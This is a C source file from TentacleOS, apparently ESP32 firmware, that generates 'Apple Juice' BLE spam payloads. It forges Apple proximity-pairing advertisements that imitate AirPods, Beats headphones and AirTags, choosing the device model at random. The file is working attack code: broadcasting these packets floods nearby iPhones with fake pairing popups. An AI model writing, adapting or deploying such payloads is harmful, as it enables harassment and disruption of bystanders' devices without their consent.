// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "apple_juice_spam.h"

#include <string.h>

#include "esp_random.h"

// Device catalog: WillyJL / Spooks4576, BLE Spam (GPL-3.0); see docs/bluetooth/DEVICE_CATALOG.md.

static const char *TAG = "APPLE_JUICE_SPAM";

#define IOS1_PAYLOAD_SIZE         31
#define IOS2_PAYLOAD_SIZE         23
#define APPLE_AIRTAG_MODEL        0x0055
#define APPLE_AIRTAG_HERMES_MODEL 0x0030
#define APPLE_AIRTAG_PREFIX       0x05
#define APPLE_PAIR_PREFIX         0x07

static const uint16_t IOS1_DEVICE_TYPES[] = {
    0x0E20, // AirPods Pro
    0x0A20, // AirPods Max
    0x0055, // Airtag
    0x0030, // Hermes Airtag
    0x0220, // AirPods
    0x0F20, // AirPods 2nd Gen
    0x1320, // AirPods 3rd Gen
    0x1420, // AirPods Pro 2nd Gen
    0x1020, // Beats Flex
    0x0620, // Beats Solo 3
    0x0320, // Powerbeats 3
    0x0B20, // Powerbeats Pro
    0x0C20, // Beats Solo Pro
    0x1120, // Beats Studio Buds
    0x0520, // Beats X
    0x0920, // Beats Studio 3
    0x1720, // Beats Studio Pro
    0x1220, // Beats Fit Pro
    0x1620, // Beats Studio Buds+
};
#define IOS1_DEVICE_TYPES_COUNT (sizeof(IOS1_DEVICE_TYPES) / sizeof(IOS1_DEVICE_TYPES[0]))

static const uint8_t IOS2_DEVICE_TYPES[] = {
    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
#define IOS2_DEVICE_TYPES_COUNT (sizeof(IOS2_DEVICE_TYPES) / sizeof(IOS2_DEVICE_TYPES[0]))

int generate_apple_juice_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL)
    return 0;

  int rand_choice = esp_random() % 2;
  if (rand_choice == 0) {
    uint16_t model = IOS1_DEVICE_TYPES[esp_random() % IOS1_DEVICE_TYPES_COUNT];
    uint8_t prefix = (model == APPLE_AIRTAG_MODEL || model == APPLE_AIRTAG_HERMES_MODEL)
                         ? APPLE_AIRTAG_PREFIX
                         : APPLE_PAIR_PREFIX;
    uint8_t packet[IOS1_PAYLOAD_SIZE] = {
        0x1e,           0xff, 0x4c, 0x00, 0x07, 0x19, prefix, (uint8_t)(model >> 8),
        (uint8_t)model, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00,   0x45,
        0x12,           0x12, 0x12, 0x00, 0x00, 0x00, 0x00,   0x00,
        0x00,           0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    if (max_len < IOS1_PAYLOAD_SIZE)
      return 0;
    memcpy(buffer, packet, IOS1_PAYLOAD_SIZE);
    return IOS1_PAYLOAD_SIZE;
  } else {
    uint8_t device_byte = IOS2_DEVICE_TYPES[esp_random() % IOS2_DEVICE_TYPES_COUNT];
    uint8_t packet[IOS2_PAYLOAD_SIZE] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04,        0x2a, 0x00,
                                         0x00, 0x00, 0x0f, 0x05, 0xc1, device_byte, 0x60, 0x4c,
                                         0x95, 0x00, 0x00, 0x10, 0x00, 0x00,        0x00};
    if (max_len < IOS2_PAYLOAD_SIZE)
      return 0;
    memcpy(buffer, packet, IOS2_PAYLOAD_SIZE);
    return IOS2_PAYLOAD_SIZE;
  }
}
